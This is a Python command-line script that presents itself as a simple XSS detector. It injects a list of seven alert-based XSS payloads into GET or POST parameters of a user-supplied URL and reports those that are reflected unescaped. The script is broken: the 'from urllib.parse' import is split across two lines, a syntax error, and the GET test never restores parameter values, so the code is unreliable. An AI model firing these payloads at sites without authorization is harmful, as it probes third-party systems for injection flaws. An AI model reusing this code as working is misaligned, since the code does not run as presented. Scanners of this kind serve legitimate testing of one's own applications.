<![CDATA[
"""
Simple XSS Vulnerability Detector

This script attempts to detect potential XSS vulnerabilities in a simple web application by 
injecting common XSS payloads into user input parameters of GET or POST requests, then 
analyzing the reflected response to check if the payload appears unsanitized.


The script will prompt for:
 - Target URL (for GET testing)
 - HTTP method (GET or POST)
 - Parameter names and values (for POST, multiple; for GET it parses URL parameters)
 
Design Notes:
- Provides clear console output focused on developer experience.
- Minimal, clean output reporting vulnerabilities found.
"""

import requests
from urllib.parse
import urlparse, parse_qs, urlencode, urlunparse
import sys

COMMON_XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "\"'><script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "'\"><svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<math><mi xlink:href=\"javascript:alert('XSS')\">",
]

def detect_xss_in_text(text, payload):
    return payload in text

def test_get(url):
    print("\n[*] Testing GET parameters for XSS injection...\n")

    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)

    if not query_params:
        print("[ERROR] No parameters found in URL to test.")
        return

    vulnerable_params = []

    for param in query_params:
        original_value = query_params[param][0] if query_params[param] else ""
        print(f"Testing parameter: {param}")

        found_vuln = False
        for payload in COMMON_XSS_PAYLOADS:
            # Inject payload
            query_params[param][0] = original_value + payload
            injected_query = urlencode(query_params, doseq=True)
            injected_url = urlunparse(
                (parsed.scheme, parsed.netloc, parsed.path, parsed.params, injected_query, parsed.fragment)
            )
            try:
                response = requests.get(injected_url, timeout=10)
                if detect_xss_in_text(response.text, payload):
                    print(f"  [!] Potential XSS vulnerability detected for parameter '{param}' with payload:\n      {payload}\n")
                    vulnerable_params.append((param, payload, injected_url))
                    found_vuln = True
                    break
            except requests.RequestException as e:
                print(f"[ERROR] Request failed: {e}")
                return
        if not found_vuln:
            print(f"  [-] No XSS detected on parameter: {param}\n")

    if not vulnerable_params:
        print("No XSS vulnerabilities detected with tested payloads.")
    else:
        print("Summary of potential vulnerabilities found:")
        for vp in vulnerable_params:
            print(f" Parameter: {vp[0]}")
            print(f" Payload: {vp[1]}")
            print(f" URL: {vp[2]}\n")

def test_post(url):
    print("\n[*] Testing POST parameters for XSS injection...\n")

    post_params = {}
    print("Enter POST parameters (key=value), one per line. Enter blank line to finish:")
    while True:
        line = input()
        if not line.strip():
            break
        if '=' not in line:
            print("[WARN] Invalid input format, expected key=value.")
            continue
        key, value = line.split('=', 1)
        post_params[key.strip()] = value.strip()

    if not post_params:
        print("[ERROR] No POST parameters provided.")
        return

    vulnerable_params = []

    for param in post_params.keys():
        original_value = post_params[param]
        print(f"Testing parameter: {param}")
        found_vuln = False

        for payload in COMMON_XSS_PAYLOADS:
            post_params[param] = original_value + payload
            try:
                response = requests.post(url, data=post_params, timeout=10)
                if detect_xss_in_text(response.text, payload):
                    print(f"  [!] Potential XSS vulnerability detected for parameter '{param}' with payload:\n      {payload}\n")
                    vulnerable_params.append((param, payload))
                    found_vuln = True
                    break
            except requests.RequestException as e:
                print(f"[ERROR] Request failed: {e}")
                return
        # reset param value
        post_params[param] = original_value
        if not found_vuln:
            print(f"  [-] No XSS detected on parameter: {param}\n")

    if not vulnerable_params:
        print("No XSS vulnerabilities detected with tested payloads.")
    else:
        print("Summary of potential vulnerabilities found:")
        for vp in vulnerable_params:
            print(f" Parameter: {vp[0]}")
            print(f" Payload: {vp[1]}\n")


def main():
    print("\n=== Simple XSS Vulnerability Detector ===\n")
    target_url = input("Enter target URL (include parameters for GET testing): ").strip()
    if not (target_url.startswith("http://") or target_url.startswith("https://")):
        print("[ERROR] Please enter a valid URL starting with http:// or https://")
        sys.exit(1)

    method = input("HTTP method to test (GET or POST): ").strip().upper()
    if method not in ("GET", "POST"):
        print("[ERROR] Unsupported HTTP method. Choose GET or POST.")
        sys.exit(1)

    if method == "GET":
        test_get(target_url)
    else:
        test_post(target_url)

    print("\n=== Test completed ===\n")

if __name__ == "__main__":
    main()
]]>
